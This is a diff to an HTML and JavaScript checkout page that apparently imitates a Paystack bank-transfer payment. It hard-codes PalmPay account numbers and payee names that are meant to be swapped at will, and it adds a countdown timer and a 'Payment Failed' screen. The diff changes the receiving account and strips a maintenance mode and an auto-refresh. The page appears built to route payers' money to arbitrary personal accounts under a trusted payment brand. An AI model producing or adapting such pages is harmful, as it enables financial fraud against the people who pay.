@@ -14,23 +14,9 @@
     .email { font-size: 13px; color: #555; margin-bottom: 5px; display: flex; justify-content: space-between; }
     .amount-green { color: #00b87c; font-weight: 600; }
     .title { font-size: 18px; font-weight: 600; margin-bottom: 15px; }
-
     .box { background: #f5f5f5; border-radius: 10px; padding: 15px; margin: 20px 0; }
     .label { font-size: 12px; color: gray; }
     .value { font-size: 16px; font-weight: 500; margin-bottom: 15px; }
-    
-    /* Premium Inline Notice Box directly under Amount */
-    .amount-notice {
-      background: #fffbe6;
-      border: 1px solid #ffe58f;
-      border-radius: 6px;
-      padding: 8px 10px;
-      font-size: 11.5px;
-      color: #8a6d3b;
-      line-height: 1.4;
-      margin-top: -5px;
-    }
-
     .expires { text-align: center; font-size: 12px; color: gray; margin-bottom: 20px; }
     .expires span { color: #00b87c; font-weight: bold; }
     .btn { width: 100%; padding: 15px; background: #f5f5f5; border: none; border-radius: 6px; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 15px; }
@@ -42,13 +28,6 @@
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .failed-message h2 { color: red; font-size: 20px; margin-bottom: 10px; }
     .failed-message p { font-size: 14px; color: #555; }
-    
-    /* Service Unavailable Message Styling */
-    .unavailable-message { display: none; text-align: center; padding: 40px 20px; }
-    .unavailable-message img { width: 44px; height: 44px; margin-bottom: 15px; opacity: 0.6; }
-    .unavailable-message h2 { color: #333; font-size: 18px; margin-bottom: 10px; font-weight: 600; }
-    .unavailable-message p { font-size: 13.5px; color: #666; line-height: 1.5; margin-bottom: 20px; }
-
     .hidden { display: none !important; }
     .vc { outline: none; border: none; text-decoration: none; color: black; }
   </style>
@@ -73,11 +52,7 @@
         <div><div class="label">ACCOUNT NAME</div><div class="value" id="display-acc-name">...</div></div>
         <div><div class="label">BANK NAME</div><div class="value" id="display-bank-name">...</div></div>
         <div><div class="label">ACCOUNT NUMBER</div><div class="value" id="display-acc-num">...</div></div>
-        <div><div class="label">AMOUNT</div><div class="value" style="margin-bottom: 8px;">NGN 5,928</div></div>
-        
-        <div class="amount-notice">
-          <b>Important:</b> Transfer the exact amount of <b>NGN 5,928</b>. Any variation in amount may prevent automated payment verification.
-        </div>
+        <div><div class="label">AMOUNT</div><div class="value">NGN 5,928</div></div>
       </div>
 
       <div class="expires">
@@ -104,61 +79,21 @@
       <h2>Payment Failed</h2>
       <p>Sorry, this transaction was not successful. Please try again with a new session.</p>
     </div>
-
-    <div class="unavailable-message" id="unavailable-message">
-      <img src="https://img.icons8.com/ios-filled/100/666666/error.png" alt="unavailable" />
-      <h2>This payment option is currently unavailable</h2>
-      <p>We are unable to process bank transfer payments at this moment. Please try again in a few minutes/hours or choose another payment method to complete your transaction.</p>
-      <div class="footer-buttons">
-        <button class="vc"><a class="vc" href="pay2">↯ Try Another Payment Method</a></button>
-      </div>
-    </div>
   </div>
 
   <script>
-    // --- MODE TOGGLE: CHANGE BETWEEN "N" AND "NN" ---
-    // "N"  = Normal operation (displays bank account details)
-    // "NN" = Service unavailable mode (hides bank account details)
-    const MAINTENANCE_MODE = "N";
-
     const DURATION = 30 * 60 * 1000;
-    const REFRESH_INTERVAL = 1 * 60 * 1000; // 1 minute auto-refresh
     const END_TIME_KEY = "paystack_timer";
     const CLICK_COUNT_KEY = "paystack_clicks";
     const ACC_INDEX_KEY = "paystack_account_index";
-    const NEXT_REFRESH_KEY = "paystack_next_refresh";
 
     // --- CHANGE THESE ACCOUNTS WHENEVER YOU WANT ---
     const accounts = [
-      { num: "8733009030", bank: "PalmPay Limited", name: "ATrove(Pay NGN 5928.00)" },
-      { num: "8733009030", bank: "PalmPay Limited", name: "ATrove(Pay NGN 5928.00)" },
-      { num: "8733009030", bank: "PalmPay Limited", name: "ATrove(Pay NGN 5928.00)" },
-      { num: "8733009030", bank: "PalmPay Limited", name: "ATrove(Pay NGN 5928.00)" }
+      { num: "6692921017", bank: "PalmPay Limited", name: "MFY MFY(TOPIFY)" },
+      { num: "6692921017", bank: "PalmPay Limited", name: "MFY MFY(TOPIFY)" },
+      { num: "6692921017", bank: "PalmPay Limited", name: "MFY MFY(TOPIFY)" },
+      { num: "6692921017", bank: "PalmPay Limited", name: "MFY MFY(TOPIFY)" }
     ];
-
-    const timerEl = document.getElementById("timer");
-    const paymentSection = document.getElementById("payment-section");
-    const loadingScreen = document.getElementById("loading-screen");
-    const failedMessage = document.getElementById("failed-message");
-    const unavailableMessage = document.getElementById("unavailable-message");
-
-    // Persisted 1-Minute Auto-Refresh Logic
-    function handleAutoRefresh() {
-      const now = Date.now();
-      let nextRefresh = parseInt(localStorage.getItem(NEXT_REFRESH_KEY));
-
-      if (!nextRefresh || now >= nextRefresh) {
-        nextRefresh = now + REFRESH_INTERVAL;
-        localStorage.setItem(NEXT_REFRESH_KEY, nextRefresh);
-      }
-
-      const timeUntilRefresh = nextRefresh - now;
-
-      setTimeout(() => {
-        localStorage.setItem(NEXT_REFRESH_KEY, Date.now() + REFRESH_INTERVAL);
-        window.location.reload();
-      }, timeUntilRefresh);
-    }
 
     function initializeAccount() {
       let savedIndex = localStorage.getItem(ACC_INDEX_KEY);
@@ -176,6 +111,11 @@
       document.getElementById("display-bank-name").textContent = account.bank;
       document.getElementById("display-acc-name").textContent = account.name;
     }
+
+    const timerEl = document.getElementById("timer");
+    const paymentSection = document.getElementById("payment-section");
+    const loadingScreen = document.getElementById("loading-screen");
+    const failedMessage = document.getElementById("failed-message");
 
     function formatTime(ms) {
       const totalSeconds = Math.floor(ms / 1000);
@@ -233,16 +173,9 @@
       processStandardTimeout(nextClicks);
     }
 
-    // --- MAIN INITIALIZATION CONTROL ---
-    handleAutoRefresh();
-
-    if (MAINTENANCE_MODE === "N") {
-      paymentSection.classList.add("hidden");
-      unavailableMessage.style.display = "block";
-    } else {
-      initializeAccount();
-      startTimer();
-    }
+    // Standard initial execution
+    initializeAccount();
+    startTimer();
   </script>
 </body>
 </html>
